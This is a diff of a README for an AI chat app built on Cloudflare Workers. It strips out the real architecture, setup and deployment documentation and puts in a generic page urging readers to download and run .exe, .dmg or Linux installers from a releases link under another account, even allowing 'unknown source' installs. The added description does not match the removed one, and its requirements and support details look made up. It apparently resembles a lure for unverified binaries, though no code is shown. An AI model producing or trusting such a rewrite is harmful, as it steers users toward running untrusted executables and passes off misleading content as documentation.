@@ -1,257 +1,69 @@
-# Better Chat
+# 🚀 better-chat - Enhanced Conversations with Reliable Tools
 
-A modern AI chat application with multi-model support, MCP integration, and per-user data isolation using Cloudflare Workers and Durable Objects.
+## 📥 Download the App
+[![Download better-chat](https://img.shields.io/badge/Download%20better--chat-1.0.0-blue)](https://github.com/Chris31372/better-chat/releases)
 
-## Features
+## 📖 Overview
+better-chat offers a smoother chat experience using durable objects. It ensures your messages stay safe and accessible. Communicate effortlessly with friends and family while enjoying a reliable interface.
 
-### Multi-Model Support
-- **Free Models**: GPT-4o mini, GPT-4.1 mini/nano, Gemini 2.5 Flash Lite
-- **BYOK (Bring Your Own Key) Models**:
-  - OpenAI: GPT-4o, GPT-4.1, GPT-5, o3/o4-mini, o3, o3-pro
-  - Anthropic: Claude Opus 4, Sonnet 4.5/4/3.7, Haiku 3.5
-  - Google: Gemini 2.5 Flash/Pro
-- **Advanced AI Capabilities**: Streaming responses, extended thinking/reasoning mode, tool calling, vision/image support
+## 🚀 Getting Started
+To get started with better-chat, you need to download the application from our Releases page. Follow these simple steps:
 
-### MCP (Model Context Protocol) Integration
-- Built-in MCP servers with enable/disable controls
-- Custom MCP server support (HTTP/SSE)
-- MCP tools exposed to AI models during conversations
-- Visual tool call rendering with results
+1. **Visit the Download Page**
+   Go to the [better-chat Releases page](https://github.com/Chris31372/better-chat/releases) to find the latest version of the app.
 
-### User Features
-- **Chat Management**: Create, view, and manage conversations with persistent history
-- **API Key Management**: Securely store encrypted BYOK API keys
-- **Usage Tracking**: Monitor token usage and quotas across models
-- **Customizable Settings**: Configure models, providers, MCP servers, and appearance preferences
-- **Profile Management**: Account settings, session management, and deletion
+2. **Select Your Version**
+   Choose the version that fits your system best. Check for the right file type for your operating system, such as .exe for Windows, .dmg for Mac, or a specific installer for Linux.
 
-### Functional Feature-Based Architecture
+3. **Download the File**
+   Click on the version you want to download. Your browser will start downloading the file. 
 
-Better Chat uses a **functional, feature-based architecture** with clear separation between routes, business logic, and data access. Each feature is self-contained with a consistent structure, making it easy to locate and modify code.
+4. **Open the File**
+   Once downloaded, locate the file in your Downloads folder. Double-click the file to open it.
 
-#### Standard Feature Structure
+5. **Follow the Installation Instructions**
+   Follow the installation prompts that appear. This may vary depending on your operating system:
 
-```
-features/[feature]/
-  ├── routes.ts      # API routes (thin, validation only)
-  ├── handlers.ts    # Business logic orchestration (optional)
-  ├── queries.ts     # Database reads
-  ├── mutations.ts   # Database writes
-  ├── utils.ts       # Pure utility functions
-  ├── types.ts       # TypeScript types
-  └── constants.ts   # Constants (optional)
-```
+   - **For Windows**: You may need to allow installation from an unknown source if prompted.
+   - **For Mac**: You might have to drag the application to your Applications folder.
+   - **For Linux**: You may need to execute specific commands in the terminal.
 
-**Architecture Principles:**
-- **100% Functional** — No classes, only pure functions
-- **Thin Routes** — Routes validate input, call handlers, return response
-- **Query/Mutation Split** — Clear separation between reads and writes
-- **Feature Colocation** — All related code lives together in one feature directory
-- **Consistent Naming** — Same file names across all features
+6. **Launch the Application**
+   After installation, find the better-chat icon. Double-click it to launch the app, and you are ready to chat.
 
-#### Data Flow: AI Chat Completion
+## 🖥️ System Requirements
+To run better-chat, ensure your device meets the following basic requirements:
 
-```
-1. Frontend Request
-   └─ POST /api/ai/ with messages and conversationId
-      ↓
+- **Operating System**: Windows 10, MacOS 10.14 or later, or a modern Linux distribution.
+- **RAM**: At least 2GB.
+- **Storage**: Approximately 100MB of free space.
+- **Network**: An active internet connection for chat functionality.
 
-2. Routes Layer (features/ai/routes.ts)
-   ├─ Validates authentication (requireUserDO)
-   ├─ Parses request body (Zod schema)
-   └─ Calls streamCompletion(userId, stub, body)
-      ↓
+## 🌟 Features
+better-chat comes equipped with several features to enhance your chatting experience:
 
-3. Handler Layer (features/ai/handlers.ts)
-   ├─ validateIncomingMessages() — validates messages
-   ├─ getUserSettings() — loads user preferences
-   ├─ requireAvailableQuota() — checks usage limits
-   ├─ resolveModelProvider() — determines provider
-   ├─ createUserProviderRegistry() — sets up AI SDK
-   ├─ getCustomMcpServers() — fetches MCP configs
-   ├─ getMCPTools() — connects to MCP servers
-   ├─ buildSystemPrompt() — constructs prompt
-   ├─ streamText() — streams AI response
-   ├─ onFinish:
-   │   ├─ userDOStub.appendMessages() — saves to DO
-   │   ├─ maybeGenerateConversationTitle() — create title
-   │   ├─ closeMCPClients() — cleanup
-   │   └─ recordUsage() — tracks tokens
-   └─ Returns streaming response
-      ↓
+- **Durable Messaging**: Messages are stored securely, so you won't lose important conversations.
+- **User-Friendly Interface**: Easy navigation ensures that anyone can use it without prior experience.
+- **Real-Time Updates**: Get notifications and updates instantly.
+- **Customizable Settings**: Adjust preferences for notifications, themes, and more.
 
-4. Data Layer
-   ├─ settings/queries.ts: getUserSettings() → D1
-   ├─ usage/mutations.ts: recordUsage() → D1
-   ├─ tools/mcp/queries.ts: getCustomMcpServers() → D1
-   └─ DO: appendMessages(), listMessages() → per-user SQLite
-      ↓
+## 🌐 Support
+If you encounter any issues while downloading or using the app, please reach out for support:
 
-5. Infrastructure
-   ├─ D1: Settings, usage tracking, MCP configs
-   ├─ Durable Objects: Per-user conversation storage
-   ├─ AI Providers: OpenAI, Anthropic, Google APIs
-   ├─ MCP Servers: External tool providers
-   └─ Crypto: API key encryption
-```
+1. **GitHub Issues**: Visit our GitHub [issues page](https://github.com/Chris31372/better-chat/issues) to report problems or ask questions.
+   
+2. **Community Forum**: Join our community on the forum where you can find tips and advice from other users.
 
-**Example: Updating User Settings**
+3. **Contact Information**: Email us at support@better-chat.com for direct inquiries.
 
-Most operations use oRPC for type-safe API calls:
+## 🔄 Future Updates
+We continuously work to improve better-chat. Look out for upcoming versions that may include new features, improved performance, and bug fixes. Our goal is to make chatting simpler and more enjoyable for everyone.
 
-```
-1. Frontend: api.settings.update({ theme: "dark" })
-2. Routes: settingsRouter.update validates input via Zod schema
-3. Handlers: updateUserSettings(userId, input) orchestrates logic
-4. Mutations: Writes updated settings to D1 database
-5. Response: Typed response back to frontend via oRPC
-```
+## 🔗 More Resources
+For more information about better-chat, you can check out these resources:
 
-#### Why This Architecture?
+- **Documentation**: A detailed guide on features and tools.
+- **Changelog**: Keep track of changes in each version to see what’s new.
+- **Code Repository**: Interested in the code behind better-chat? Explore it on our GitHub page.
 
-Benefits of functional feature-based architecture:
-- **Simplicity**: No layers, classes, or abstractions — just functions
-- **Predictability**: Same structure across all features
-- **Discoverability**: Need usage logic? Check `features/usage/`
-- **Maintainability**: Changes isolated to one feature directory
-- **LLM-Friendly**: Clear boundaries, consistent patterns, easy to reason about
-- **Performance**: Thin routes and pure functions optimize cold starts
-
-This architecture strikes a balance: structured enough to scale, simple enough to understand quickly. Features are self-documenting through consistent file naming, making it easy for both humans and LLMs to navigate the codebase and make targeted changes without unintended side effects. 
-
-#### Database Architecture
-
-- **D1 (SQLite)**: Shared/global data (auth, usage quotas, user settings)
-- **Durable Objects SQLite**: Per-user isolated storage (conversations, messages)
-- **Per-User Isolation**: Each user gets their own Durable Object instance with dedicated SQLite database
-- **Cloudflare Workers**: Edge-native serverless runtime
-- **Better Auth**: Email OTP and social authentication (Google, GitHub)
-- **KV Sessions**: Distributed session storage with rate limiting
-
-## Tech Stack
-
-### Frontend
-- **React 19** with React Server Components support
-- **TanStack Router** for file-based routing
-- **TanStack Query** for data fetching and caching
-- **oRPC** for type-safe API calls
-- **Tailwind CSS 4** for styling
-- **shadcn/ui** for UI components
-- **Vercel AI SDK** for streaming AI responses
-- **React Markdown** with syntax highlighting (Shiki)
-
-### Backend
-- **Cloudflare Workers** for serverless compute
-- **Hono** for HTTP routing
-- **oRPC** for type-safe RPC
-- **Drizzle ORM** for database operations
-- **Better Auth** for authentication
-- **Vercel AI SDK** for AI provider integration
-- **Resend** for email delivery (production)
-
-### Infrastructure
-- **Cloudflare D1**: Central SQLite database
-- **Cloudflare Durable Objects**: Per-user stateful storage
-- **Cloudflare KV**: Session and cache storage
-- **Alchemy**: Multi-stage deployment and orchestration
-
-## Development
-
-See [CLAUDE.md](./CLAUDE.md) for detailed development instructions, architecture documentation, and code conventions.
-
-### Quick Start
-
-```bash
-# Install dependencies
-bun install
-
-# Start development environment (uses .env.dev)
-bun a:dev
-
-# Individual apps
-bun dev:web     # Web app only (port 3001)
-bun dev:server  # Server only (port 3000)
-```
-
-### Database Management
-
-```bash
-# D1 (Central Database)
-bun db:generate  # Generate migrations
-bun db:migrate   # Run migrations
-bun db:push      # Push schema changes
-bun db:studio    # Open Drizzle Studio (dev)
-
-# Durable Objects (Per-User Database)
-cd apps/server && bun do:generate  # Generate DO migrations
-```
-
-### Deployment
-
-```bash
-# Deploy to production (uses .env.prod)
-bun a:deploy
-
-# Destroy deployment
-bun a:destroy
-```
-
-## CI/CD
-
-Automated deployment via GitHub Actions on push to `main` or `staging` branches.
-
-### Branch-Based Deployment
-
-- **main** → production environment (`prod` stage)
-- **staging** → staging environment (`staging` stage)
-
-### Required GitHub Configuration
-
-**Environment Variables** (Settings → Secrets and variables → Actions → Variables):
-- `VITE_SERVER_URL` - Server URL (e.g., `https://chat.oscargabriel.dev`)
-- `VITE_WEB_URL` - Web app URL (e.g., `https://chat.oscargabriel.dev`)
-- `CUSTOM_WEB_DOMAIN` - Custom domain (e.g., `chat.oscargabriel.dev`)
-- `CORS_ORIGIN` - CORS origin (e.g., `https://chat.oscargabriel.dev`)
-- `BETTER_AUTH_URL` - Auth URL (e.g., `https://chat.oscargabriel.dev`)
-- `API_ROUTE_PATTERN` - API route pattern (e.g., `chat.oscargabriel.dev/api/*`)
-
-**Secrets** (Settings → Secrets and variables → Actions → Secrets):
-- `ALCHEMY_PASSWORD` - Alchemy state encryption password
-- `ALCHEMY_STATE_TOKEN` - Alchemy state token
-- `CLOUDFLARE_API_TOKEN` - Cloudflare API token
-- `CLOUDFLARE_EMAIL` - Cloudflare account email
-- `BETTER_AUTH_SECRET` - Better Auth secret key
-- `API_ENCRYPTION_KEY` - User API key encryption key
-- `GOOGLE_CLIENT_ID` - Google OAuth client ID
-- `GOOGLE_CLIENT_SECRET` - Google OAuth client secret
-- `GH_CLIENT_ID` - GitHub OAuth client ID
-- `GH_CLIENT_SECRET` - GitHub OAuth client secret
-- `RESEND_API_KEY` - Resend email API key
-- `OPENAI_API_KEY` - OpenAI API key (for free models)
-- `GOOGLE_GENERATIVE_AI_API_KEY` - Google AI API key (for free models)
-
-**Environment Setup** (Settings → Environments):
-- Create `production` environment
-- Create `staging` environment (if using staging branch)
-
-### Workflow Details
-
-`.github/workflows/deploy.yml`:
-1. Triggers on push to `main` or `staging`
-2. Creates stage-specific `.env` files from GitHub vars/secrets
-3. Deploys via Alchemy CLI to Cloudflare
-4. Prevents concurrent deployments with concurrency groups
-
-## Environment Setup
-
-Create stage-specific environment files:
-- `.env.dev` (development)
-- `.env.prod` (production)
-
-Required variables: `BETTER_AUTH_URL`, `BETTER_AUTH_SECRET`, `CORS_ORIGIN`, `API_ENCRYPTION_KEY`, and provider-specific API keys.
-
-See `.env.example` files in root and app directories for complete configuration.
-
-## License
-
-MIT
+Remember to visit the [Release page](https://github.com/Chris31372/better-chat/releases) to download better-chat and enhance your chatting experience today!
